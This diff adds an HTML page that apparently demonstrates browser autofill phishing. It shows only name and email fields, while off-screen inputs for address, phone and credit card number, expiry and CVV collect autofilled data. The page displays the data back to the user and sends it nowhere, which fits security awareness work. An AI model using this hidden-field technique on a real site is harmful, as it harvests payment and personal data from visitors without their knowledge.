@@ -1,0 +1,145 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Autofill Phishing</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+      body {
+        background-color: #343a40;
+        color: #f8f9fa;
+      }
+      .container {
+        background-color: #495057;
+        padding: 20px;
+        border-radius: 10px;
+      }
+      .form-control {
+        background-color: #ffffff;
+        color: #000000;
+        border: 1px solid #ced4da;
+      }
+      .form-control::placeholder {
+        color: #000000;
+      }
+      .btn-primary {
+        background-color: #007bff;
+        border-color: #007bff;
+      }
+      .btn-primary:hover {
+        background-color: #0056b3;
+        border-color: #004085;
+      }
+      .modal-content {
+        background-color: #ffffff;
+        color: #000000;
+      }
+      .modal-header {
+        border-bottom: 1px solid #6c757d;
+      }
+      .modal-footer {
+        border-top: 1px solid #6c757d;
+      }
+      .off-screen {
+        position: absolute;
+        left: -9999px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container mt-5">
+      <h2>Autofill Danger!</h2>
+      <form id="phishingForm">
+        <div class="form-group">
+          <label for="name">Name</label>
+          <input id="name" name="name" type="text" class="form-control" placeholder="Your Name">
+        </div>
+        <div class="form-group">
+          <label for="email">Email</label>
+          <input id="email" name="email" type="email" class="form-control" placeholder="Your Email">
+        </div>
+        <div class="form-group">
+          <input type="submit" value="Submit" class="btn btn-primary">
+        </div>
+        <div class="form-group off-screen">
+          <input id="phone" name="phone" type="text" placeholder="Your Phone" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+          <input id="organization" name="organization" type="text" placeholder="Your Organization" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+          <input id="address" name="address" type="text" placeholder="Your Address" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+          <input id="postal" name="postal" type="text" placeholder="Your Postal Code" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+          <input id="city" name="city" type="text" placeholder="Your City" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+            <input id="state" name="state" type="text" placeholder="Your State" class="form-control">
+          </div>
+        <div class="form-group off-screen">
+          <select name="country" class="form-control">
+            <option value=""></option>
+            <option value="FI">Finland</option>
+          </select>
+        </div>
+        <div class="form-group off-screen">
+          <input type="text" name="cc_number" class="form-control">
+        </div>
+        <div class="form-group off-screen">
+          <select name="cc_month" id="cc_month" class="form-control">
+            <option value="01">01</option>
+            <option value="02">02</option>
+          </select>
+          <select name="cc_year" id="cc_year" class="form-control">
+            <option>2024</option>
+          </select>
+        </div>
+        <div class="form-group off-screen">
+          <input type="text" id="cc_cvv" name="cc_cvv" class="form-control">
+        </div>
+      </form>
+    </div>
+
+    <div class="modal fade" id="resultModal" tabindex="-1" role="dialog" aria-labelledby="resultModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="resultModalLabel">Form Submission Data</h5>
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <p id="resultContent"></p>
+          </div>
+          <div class="modal-footer">
+            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script type="text/javascript">
+        function displayModal(content) {
+          document.getElementById('resultContent').innerHTML = content;
+          $('#resultModal').modal('show');
+        }
+  
+        document.getElementById('phishingForm').addEventListener('submit', function(event) {
+          event.preventDefault();
+          const formData = new FormData(event.target);
+          let resultText = 'You submitted the following data:<br>';
+          formData.forEach((value, key) => {
+            resultText += `<strong>${key}:</strong> ${value}<br>`;
+          });
+          displayModal(resultText);
+        });
+      </script>
+  </body>
+</html>
+<!-- Inspired by Viljami Kuosmanen - https://github.com/anttiviljami/browser-autofill-phishing -->
